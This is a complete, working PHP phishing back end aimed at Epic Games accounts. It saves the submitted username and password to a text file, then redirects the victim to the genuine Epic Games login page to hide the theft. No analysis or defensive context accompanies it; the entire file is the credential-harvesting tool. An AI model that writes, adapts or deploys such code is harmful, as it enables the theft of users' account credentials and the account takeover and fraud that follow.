<?php
file_put_contents("usernames.txt", "Epic Games Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.epicgames.com/id/login');
exit();
?>